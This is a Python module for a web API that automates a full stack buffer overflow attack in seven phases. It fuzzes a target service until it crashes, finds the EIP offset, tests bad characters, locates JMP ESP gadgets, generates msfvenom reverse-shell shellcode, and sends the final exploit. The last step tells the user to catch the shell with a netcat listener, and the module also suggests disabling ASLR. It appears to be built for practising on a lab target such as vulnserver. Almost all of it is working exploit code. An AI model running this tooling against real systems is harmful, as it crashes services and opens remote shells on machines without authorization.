# ══════════════════════════════════════════════════════════════
#  BUFFER OVERFLOW MODULE — PASTE AT BOTTOM OF main.py ON KALI
#  7 endpoints — one per BOF phase (fully automated)
# ══════════════════════════════════════════════════════════════
# Requires: ROPgadget  →  sudo apt install python3-ropgadget
#           msfvenom   →  included in Metasploit
#           gcc-multilib → sudo apt install gcc-multilib

import socket as _sock, struct as _struct, time as _time

class BOFRequest(BaseModel):
    target:       str            # "192.168.56.102:9999"
    prefix:       str  = ""      # command prefix e.g. "OVERFLOW1 "
    fuzz_step:    int  = 100
    pattern_size: int  = 500
    eip_value:    str  = ""      # hex e.g. "41386541" — from debugger
    offset:       int  = 0
    bad_chars:    str  = "\\x00" # space or comma separated \\xNN
    jmp_esp:      str  = ""      # hex e.g. "0xf7e9607d"
    binary_path:  str  = "/home/kali/vulnserver"
    lhost:        str  = ""
    lport:        int  = 4444
    payload_type: str  = "linux/x86/shell_reverse_tcp"
    shellcode:    str  = ""      # raw python bytes string from msfvenom


def _bof_parse_target(target: str):
    parts = target.strip().replace("tcp://","").replace("http://","").split(":")
    host = parts[0]
    port = int(parts[1]) if len(parts) > 1 else 9999
    return host, port


def _bof_send(host, port, data: bytes, timeout=5) -> bool:
    try:
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.recv(1024)
        s.send(data + b"\r\n")
        try: s.recv(1024)
        except: pass
        s.close()
        return True
    except Exception:
        return False


def _bof_parse_bad_chars(bad_chars: str) -> list:
    import re as _re
    hexes = _re.findall(r'[0-9a-fA-F]{2}', bad_chars)
    return [int(h, 16) for h in hexes] if hexes else [0x00]


# ── PHASE 1: FUZZING ─────────────────────────────────────────
@app.post("/api/bof/fuzz")
async def bof_fuzz(req: BOFRequest, user=Depends(verify_token)):
    host, port = _bof_parse_target(req.target)
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    step   = max(10, min(req.fuzz_step, 500))
    size   = step
    crash_at = None

    for _ in range(200):          # max 200 iterations = up to 100 KB
        payload = prefix + b"A" * size
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            s.recv(1024)
            s.send(payload + b"\r\n")
            try: s.recv(1024)
            except: pass
            s.close()
        except Exception:
            crash_at = size
            break
        _time.sleep(0.3)
        size += step

    if crash_at:
        return {"crash_at": crash_at, "recommended_pattern_size": crash_at + 400,
                "message": f"Server crashed at {crash_at} bytes"}
    return {"crash_at": None, "message": "No crash detected in range — increase fuzz step or check target"}


# ── PHASE 2: EIP OFFSET ──────────────────────────────────────
@app.post("/api/bof/offset")
async def bof_offset(req: BOFRequest, user=Depends(verify_token)):
    host, port = _bof_parse_target(req.target)
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    size   = req.pattern_size or 500

    # Generate pattern
    result = await run_tool(["msf-pattern_create", "-l", str(size)], timeout=15)
    pattern = result.get("output", "").strip()
    if not pattern:
        return {"error": "msf-pattern_create failed — is Metasploit installed?"}

    # Send pattern
    sent = _bof_send(host, port, prefix + pattern.encode("latin-1"))

    # If EIP value provided, find offset
    offset = None
    if req.eip_value.strip():
        off_result = await run_tool(
            ["msf-pattern_offset", "-l", str(size), "-q", req.eip_value.strip()],
            timeout=15)
        out = off_result.get("output", "")
        import re as _re
        m = _re.search(r"Exact match at offset (\d+)", out)
        if m:
            offset = int(m.group(1))

    return {
        "pattern_size": size,
        "pattern_sent": sent,
        "pattern": pattern,
        "eip_value": req.eip_value or "— send pattern first, then enter EIP from debugger",
        "offset": offset,
        "message": f"Offset = {offset} bytes" if offset else "Pattern sent — enter EIP value from GDB/Immunity to find offset"
    }


# ── PHASE 3: EIP CONTROL ─────────────────────────────────────
@app.post("/api/bof/eip_control")
async def bof_eip_control(req: BOFRequest, user=Depends(verify_token)):
    if not req.offset:
        return {"error": "Offset required — complete Phase 2 first"}
    host, port = _bof_parse_target(req.target)
    prefix = req.prefix.encode("latin-1") if req.prefix else b""

    payload  = prefix
    payload += b"A" * req.offset
    payload += b"BBBB"                              # EIP = 0x42424242
    payload += b"C" * max(0, 500 - req.offset - 4)

    # Try to send — crash is expected
    try:
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(4)
        s.connect((host, port))
        s.recv(1024)
        s.send(payload + b"\r\n")
        try: s.recv(1024)
        except: pass
        s.close()
        sent = True
    except Exception:
        sent = True  # crash on send = expected behaviour

    return {
        "offset": req.offset,
        "payload_size": len(payload),
        "eip_overwrite": "BBBB (0x42424242)",
        "sent": sent,
        "message": f"Sent {len(payload)} bytes — EIP should show 42424242 in debugger. If yes, offset {req.offset} is confirmed."
    }


# ── PHASE 4: BAD CHARACTERS ──────────────────────────────────
@app.post("/api/bof/badchars")
async def bof_badchars(req: BOFRequest, user=Depends(verify_token)):
    if not req.offset:
        return {"error": "Offset required — complete Phase 2 first"}
    host, port = _bof_parse_target(req.target)
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    known_bad = _bof_parse_bad_chars(req.bad_chars)

    all_bytes = bytearray([b for b in range(1, 256) if b not in known_bad])

    payload  = prefix
    payload += b"A" * req.offset
    payload += b"BBBB"
    payload += bytes(all_bytes)
    payload += b"C" * max(0, 100)

    sent = _bof_send(host, port, payload)
    excluded = [f"\\x{b:02x}" for b in known_bad]

    return {
        "sent": sent,
        "bytes_tested": len(all_bytes),
        "excluded": excluded,
        "payload_size": len(payload),
        "message": f"Sent {len(all_bytes)} bytes (excluding {', '.join(excluded)}). Check ESP dump in debugger — look for any byte out of sequence."
    }


# ── PHASE 5: JMP ESP ─────────────────────────────────────────
@app.post("/api/bof/jmpesp")
async def bof_jmpesp(req: BOFRequest, user=Depends(verify_token)):
    binary = req.binary_path or "/home/kali/vulnserver"
    bad_bytes = " ".join([f"\\x{b:02x}" for b in _bof_parse_bad_chars(req.bad_chars)])

    # Run ROPgadget on binary
    result = await run_tool(["ROPgadget", "--binary", binary], timeout=30)
    out = result.get("output", "")

    import re as _re
    gadgets = []
    for line in out.splitlines():
        if "jmp esp" in line.lower():
            m = _re.match(r"(0x[0-9a-fA-F]+)\s*:\s*(.+)", line.strip())
            if m:
                addr = m.group(1)
                desc = m.group(2).strip()
                # Convert to little-endian bytes
                val  = int(addr, 16)
                le   = "".join([f"\\x{b:02x}" for b in _struct.pack("<I", val)])
                gadgets.append({"address": addr, "gadget": desc, "little_endian": le})

    if not gadgets:
        return {
            "gadgets": [],
            "message": "No JMP ESP in binary — try searching libc. Disable ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space, then retry with binary=/usr/lib32/libc.so.6"
        }

    best = gadgets[0]
    return {
        "gadgets": gadgets,
        "recommended": best,
        "address": best["address"],
        "little_endian": best["little_endian"],
        "message": f"Found {len(gadgets)} JMP ESP gadget(s). Use: {best['address']} → {best['little_endian']}"
    }


# ── PHASE 6: SHELLCODE ───────────────────────────────────────
@app.post("/api/bof/shellcode")
async def bof_shellcode(req: BOFRequest, user=Depends(verify_token)):
    if not req.lhost:
        return {"error": "LHOST required (your Kali IP)"}

    bad_bytes = "".join([f"\\x{b:02x}" for b in _bof_parse_bad_chars(req.bad_chars)])

    cmd = [
        "msfvenom",
        "-p", req.payload_type,
        f"LHOST={req.lhost}",
        f"LPORT={req.lport}",
        "EXITFUNC=thread",
        "-b", bad_bytes,
        "-f", "python",
        "-v", "shellcode"
    ]

    result = await run_tool(cmd, timeout=60)
    out = result.get("output", "")
    if "error" in result:
        return {"error": result["error"]}

    # Extract shellcode lines
    import re as _re
    lines = [l for l in out.splitlines() if "shellcode" in l and ("b\"" in l or "b'" in l)]
    shellcode_py = "\n".join(lines)

    # Extract raw bytes
    raw = _re.findall(r'b"([^"]+)"', shellcode_py)
    raw_bytes = "".join(raw)

    # Extract size
    size_m = _re.search(r"Payload size:\s*(\d+) bytes", out)
    size = int(size_m.group(1)) if size_m else None

    return {
        "payload": req.payload_type,
        "lhost": req.lhost,
        "lport": req.lport,
        "bad_chars": bad_bytes,
        "size": size,
        "shellcode_python": shellcode_py,
        "shellcode_bytes": raw_bytes,
        "message": f"Shellcode generated: {size} bytes. Copy into Phase 7."
    }


# ── PHASE 7: FINAL EXPLOIT ───────────────────────────────────
@app.post("/api/bof/exploit")
async def bof_exploit(req: BOFRequest, user=Depends(verify_token)):
    if not req.offset:
        return {"error": "Offset required"}
    if not req.jmp_esp:
        return {"error": "JMP ESP address required"}
    if not req.shellcode:
        return {"error": "Shellcode required — complete Phase 6 first"}

    host, port = _bof_parse_target(req.target)
    prefix = req.prefix.encode("latin-1") if req.prefix else b""

    # Parse JMP ESP address → little-endian bytes
    addr_int = int(req.jmp_esp.strip(), 16)
    retn = _struct.pack("<I", addr_int)

    # Parse shellcode (python bytes format)
    import re as _re
    hex_bytes = _re.findall(r'\\x([0-9a-fA-F]{2})', req.shellcode)
    sc = bytes([int(h, 16) for h in hex_bytes])

    if not sc:
        return {"error": "Could not parse shellcode — paste the raw \\xNN format from msfvenom"}

    nop_sled = b"\x90" * 16

    payload  = prefix
    payload += b"A" * req.offset
    payload += retn
    payload += nop_sled
    payload += sc

    # Send exploit
    try:
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(6)
        s.connect((host, port))
        s.recv(1024)
        s.send(payload + b"\r\n")
        try: s.recv(512)
        except: pass
        s.close()
        sent = True
    except Exception as ex:
        sent = True  # crash on delivery = shellcode running

    return {
        "sent": sent,
        "payload_size": len(payload),
        "offset": req.offset,
        "retn": req.jmp_esp,
        "nop_sled": "16 bytes",
        "shellcode_size": len(sc),
        "listener_cmd": f"nc -lvnp {req.lport}",
        "message": f"Exploit sent ({len(payload)} bytes). Start listener: nc -lvnp {req.lport}"
    }
